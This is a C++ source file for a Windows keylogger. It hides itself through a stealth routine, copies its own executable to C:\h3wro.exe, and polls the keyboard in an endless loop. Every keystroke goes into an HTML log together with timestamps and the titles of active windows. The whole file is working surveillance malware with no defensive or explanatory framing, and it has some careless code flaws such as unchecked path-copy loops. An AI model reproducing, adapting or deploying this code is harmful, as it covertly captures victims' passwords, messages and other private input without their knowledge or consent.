#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <ctime>
#include <shlobj.h>

#include "Stealth.h"
#include "Logger.h"
#include "KeyLoggerProperties.h"

int save(int key)
{
	Logger logger;
	std::string sLogs = "";
	time_t t = time(0);

	if (KeyLoggerProperties::hCurrentWindow != GetForegroundWindow())
	{
		KeyLoggerProperties::hCurrentWindow = GetForegroundWindow();
		char title[256];
		GetWindowTextA(KeyLoggerProperties::hCurrentWindow, title, sizeof(title));

		sLogs += "<font size=\"3\"><br><br><b>";
		sLogs += asctime(localtime(&t));
		sLogs += "<br>Window name: ";
		sLogs += title;
		sLogs += "]</b><br></font>";
	}

	if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0) {
		KeyLoggerProperties::is_capslock = true;
	}

	switch (key) {
	case 1:
		return 0;
		break;
	case 2:
		return 0;
		break;
		//-----------------------------------------------------------------------
		//End of mouse
		//-----------------------------------------------------------------------
	case 96:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "0";
		break;
	case 97:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "1";
		break;
	case 98:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "2";
		break;
	case 99:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "3";
		break;
	case 100:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "4";
		break;
	case 101:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "5";
		break;
	case 102:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "6";
		break;
	case 103:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "7";
		break;
	case 104:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "8";
		break;
	case 105:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "9";
		break;
		//-----------------------------------------------------------------------
		//End of numpad digits
		//-----------------------------------------------------------------------
	case 48:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += ")";
		}
		else
			sLogs += "0";
		break;
	case 49:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "!";
		}
		else
			sLogs += "1";
		break;
	case 50:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "@";
		}
		else
			sLogs += "2";
		break;
	case 51:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "#";
		}
		else
			sLogs += "3";
		break;
	case 52:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "$";
		}
		else
			sLogs += "4";
		break;
	case 53:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "%";
		}
		else
			sLogs += "5";
		break;
	case 54:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "^";
		}
		else
			sLogs += "6";
		break;
	case 55:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "&";
		}
		else
			sLogs += "7";
		break;
	case 56:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "*";
		}
		else
			sLogs += "8";
		break;
	case 57:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "(";
		}
		else
			sLogs += "9";
		break;
		//-----------------------------------------------------------------------
		//End of digits
		//-----------------------------------------------------------------------
	case 65:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#260";
			}
			else
				sLogs += "A";
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#261";
			}
			else
				sLogs += "a";
		}
		break;
	case 66:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "B";
		}
		else
			sLogs += "b";
		break;
	case 67:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#262";
			}
			else {
				sLogs += "C";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#263";
			}
			else {
				sLogs += "c";
			}
		}
		break;
	case 68:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "D";
		}
		else
			sLogs += "d";
		break;
	case 69:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#280";
			}
			else {
				sLogs += "E";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#281";
			}
			else {
				sLogs += "e";
			}
		}
		break;
	case 70:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "F";
		}
		else
			sLogs += "f";
		break;
	case 71:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "G";
		}
		else
			sLogs += "g";
		break;
	case 72:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "H";
		}
		else
			sLogs += "h";
		break;
	case 73:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "I";
		}
		else
			sLogs += "i";
		break;
	case 74:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "J";
		}
		else
			sLogs += "j";
		break;
	case 75:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "K";
		}
		else
			sLogs += "k";
		break;
	case 76:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#321";
			}
			else {
				sLogs += "L";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&322";
			}
			else {
				sLogs += "l";
			}
		}
		break;
	case 77:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "M";
		}
		else
			sLogs += "m";
		break;
	case 78:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#323";
			}
			else {
				sLogs += "N";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#324";
			}
			else {
				sLogs += "n";
			}
		}
		break;
	case 79:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#211";
			}
			else {
				sLogs += "O";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#243";
			}
			else {
				sLogs += "o";
			}
		}
		break;
	case 80:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "P";
			break;
		}
		else
			sLogs += "p";
		break;
	case 81:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "Q";
			break;
		}
		else
			sLogs += "q";
		break;
	case 82:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "R";
			break;
		}
		else
			sLogs += "r";
		break;
	case 83:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#346";
			}
			else {
				sLogs += "S";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#347";
			}
			else {
				sLogs += "s";
			}
		}
		break;
	case 84:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "T";
			break;
		}
		else
			sLogs += "t";
		break;
	case 85:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "U";
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "�";
			}
			else {
				sLogs += "u";
			}
		}
		break;
	case 86:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "V";
			break;
		}
		else
			sLogs += "v";
		break;
	case 87:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "W";
			break;
		}
		else
			sLogs += "w";
		break;
	case 88:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#377";
			}
			else {
				sLogs += "X";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#378";
			}
			else {
				sLogs += "x";
			}
		}
		break;
	case 89:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			sLogs += "Y";
			break;
		}
		else
			sLogs += "y";
		break;
	case 90:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#379";
			}
			else {
				sLogs += "Z";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				sLogs += "&#380";
			}
			else {
				sLogs += "z";
			}
		}
		//-----------------------------------------------------------------------
		//End of A-Z characters
		//-----------------------------------------------------------------------
	case 13:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "\n";
		break;
	case 20:
		KeyLoggerProperties::iBackspaceCounter = 0;
		if (KeyLoggerProperties::is_capslock == false) {
			KeyLoggerProperties::is_capslock = true;
			sLogs += "<font size=\"1\">[CapsLock]</font>";
		}
		else {
			KeyLoggerProperties::is_capslock = false;
			sLogs += "<font size=\"1\">[/CapsLock]</font>";
		}
		break;
	case VK_BACK:
		KeyLoggerProperties::iBackspaceCounter += 1;
		sLogs += "<font size=\"1\">[";
		sLogs += KeyLoggerProperties::iBackspaceCounter + '0';
		sLogs += "x";
		sLogs += "Backspace]</font>";
		break;
	case VK_SPACE:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += " ";
		break;
	case VK_MULTIPLY:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "*";
		break;
	case VK_ADD:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "+";
		break;
	case VK_SUBTRACT:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "-";
		break;
	case VK_DECIMAL:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += ".";
		break;
	case VK_DIVIDE:
		KeyLoggerProperties::iBackspaceCounter = 0;
		sLogs += "/";
		break;
	default:
		break;
	}

	logger.saveToFile(sLogs);
	logger.destroy();
	return 0;
}

using std::cout;
using std::endl;
int main(int argc, char * argv[]) {
	Stealth stealth;
	stealth.init();

	char buffer[MAX_PATH];
	::GetModuleFileNameA(NULL, buffer, MAX_PATH);

	//It swap / with //
	char sPath[MAX_PATH];
	int iIndexCounter = 0;
	for (int i = 0; i <= MAX_PATH; i++) {
		if (buffer[i] == '\\') {
			sPath[i + iIndexCounter] = '\\';
			iIndexCounter += 1;
			sPath[i + iIndexCounter] = '\\';
			continue;
		}
		sPath[i + iIndexCounter] = buffer[i];
	}

	char sDocumentsPath[MAX_PATH];
	HRESULT result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, sDocumentsPath);
	char sDocumentsPathResult[MAX_PATH];

	//It swap / with //
	int iIndexCounterDoc = 0;
	for (int i = 0; i <= MAX_PATH; i++) {
		if (sDocumentsPath[i] == '\\') {
			sDocumentsPathResult[i + iIndexCounterDoc] = '\\';
			iIndexCounterDoc += 1;
			sDocumentsPathResult[i + iIndexCounterDoc] = '\\';
			continue;
		}
		sDocumentsPathResult[i + iIndexCounterDoc] = sDocumentsPath[i];
	}

	char sCompleteDocPath[MAX_PATH];
	strcpy(sCompleteDocPath, sDocumentsPathResult);
	//strcpy(sCompleteDocPath, "\\h3wro.exe");

	BOOL b = CopyFileA(sPath, "C:\\h3wro.exe", 0);
	if (!b) {
		cout << "Error: " << GetLastError() << endl;
	}
	else {
		cout << "Okey" << endl;
	}
	char i;
	while (1) {
		for (i = 8; i <= 222; i++) {
			if (GetAsyncKeyState(i) == -32767)
				save(i);
		}
	}
	return 0;
}
